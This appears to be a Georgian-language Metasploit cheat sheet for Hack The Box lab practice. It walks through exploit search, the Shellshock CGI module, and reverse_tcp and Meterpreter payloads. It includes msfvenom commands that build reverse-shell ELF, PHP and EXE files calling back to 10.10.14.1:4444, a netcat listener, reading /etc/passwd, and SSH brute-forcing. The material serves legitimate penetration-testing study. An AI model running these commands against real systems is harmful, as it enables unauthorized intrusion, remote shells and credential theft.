# 💣 Metasploit Cheat Sheet (HTB) — ქართულად

## 📌 რა არის Metasploit

**Metasploit** — exploitation framework, რომელიც გამოიყენება:

* exploit-ის **დადასტურებისთვის**
* payload-ების გენერაციისთვის
* handler-ების სამართავად
* post-exploitation-ისთვის

⚠️ **HTB პრინციპი**

> Metasploit არ ფიქრობს შენს მაგივრად.
> ის ამოწმებს იმას, რაც უკვე იცი.

---

## 🧠 სწორი HTB Mental Model

```
Nmap / FFUF
   ↓
Manual analysis
   ↓
Searchsploit / CVE
   ↓
Metasploit (confirm exploit)
```

თუ Metasploit-ს ხსნი **მანამდე** — არასწორი ნაბიჯია.

---

## 🔹 Metasploit-ის გაშვება

```bash
msfconsole
```

ძირითადი კონსოლი:

```
msf6 >
```

---

## 🔹 Module ტიპები (უნდა იცოდე ზეპირად)

| Type      | აღწერა                        |
| --------- | ----------------------------- |
| exploit   | vulnerability exploitation    |
| payload   | რა გაეშვება exploit-ის შემდეგ |
| auxiliary | სკანერი / brute / enum        |
| post      | post-exploitation             |
| encoder   | payload encoding              |
| nop       | shellcode helpers             |

---

## 🔹 Exploit-ის ძებნა

### 🔸 Framework-ის შიგნით

```bash
search apache
```

```bash
search type:exploit platform:linux
```

```bash
search cve:2019
```

---

### 🔸 Searchsploit → Metasploit

```bash
searchsploit apache 2.4.29
```

შემდეგ:

```bash
use exploit/linux/http/...
```

📌 **Searchsploit ყოველთვის პირველია**

---

## 🔹 Exploit-ის გამოყენება

```bash
use exploit/linux/http/apache_mod_cgi_bash_env_exec
```

შემოწმება:

```bash
show options
```

სავალდებულო პარამეტრები:

```bash
set RHOSTS 10.10.10.10
set RPORT 80
```

---

## 🔹 Payload-ები (ძალიან მნიშვნელოვანი)

### 🔸 Payload-ის ნახვა

```bash
show payloads
```

### 🔸 ყველაზე ხშირად გამოყენებადი (HTB)

```bash
set payload linux/x64/meterpreter/reverse_tcp
```

ან მარტივი shell:

```bash
set payload linux/x64/shell_reverse_tcp
```

---

## 🔹 Listener / Handler

### 🔸 ავტომატური

```bash
exploit
```

### 🔸 Background

```bash
exploit -j
```

---

## 🔹 Sessions მართვა

```bash
sessions
```

```bash
sessions -i 1
```

Meterpreter → Shell:

```bash
shell
```

---

## 🔹 Meterpreter Commands (HTB essentials)

```bash
sysinfo
```

```bash
getuid
```

```bash
pwd
```

```bash
ls
```

```bash
upload linpeas.sh /tmp
```

```bash
download /etc/passwd
```

---

## 🔹 Privilege Escalation (Metasploit-ით)

### 🔸 Local exploit suggester

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

📌 ეს **არ ნიშნავს**, რომ exploit იმუშავებს
→ ხელით გადამოწმება აუცილებელია

---

## 🔹 Auxiliary Modules (შეზღუდულად გამოიყენე)

### 🔸 SSH brute (მხოლოდ დადასტურებისას)

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS target
set USERNAME admin
set PASS_FILE passwords.txt
run
```

⚠️ Blind brute-force = HTB დროის მკვლელი

---

## 🔹 Database (ოპციური, მაგრამ სასარგებლო)

```bash
db_status
```

```bash
workspace
```

```bash
hosts
```

```bash
services
```

📌 HTB exam-ზე ხშირად გამორთულია — ნუ დაეყრდნობი

---

## 🔹 msfvenom (payload generator)

### 🔸 Linux reverse shell

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f elf > shell.elf
```

---

### 🔸 PHP payload

```bash
msfvenom -p php/reverse_php LHOST=10.10.14.1 LPORT=4444 -f raw > shell.php
```

---

### 🔸 Windows exe

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe > shell.exe
```

---

## 🔹 HTB Real-World Examples

### 🧪 Example 1 — Apache exploit

```bash
search apache 2.4
use exploit/linux/http/apache_mod_cgi_bash_env_exec
set RHOSTS 10.10.10.10
set TARGETURI /cgi-bin/test.cgi
exploit
```

---

### 🧪 Example 2 — Manual payload + nc

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f elf > rev.elf
nc -lvnp 4444
```

---

### 🧪 Example 3 — Post exploitation

```bash
sessions -i 1
run post/multi/recon/local_exploit_suggester
```

---

## 🧠 მნემონიკები (HTB)

* **Search → Use → Options → Exploit**
* **Exploit ≠ Auto-Win**
* **Meterpreter = Convenience, not magic**
* **If PEAS finds it, Metasploit may exploit it**

---

## ⚠️ ტიპური შეცდომები HTB-ზე

❌ Metasploit როგორც სკანერი
❌ Exploit-ის გაშვება ვერსიის დადასტურების გარეშე
❌ Blind brute-force
❌ PrivEsc მხოლოდ Metasploit-ზე დაყრდნობა

---

## ✅ TL;DR (HTB-safe usage)

```bash
search <service>
use exploit/...
show options
set RHOSTS target
set payload reverse_tcp
exploit
```


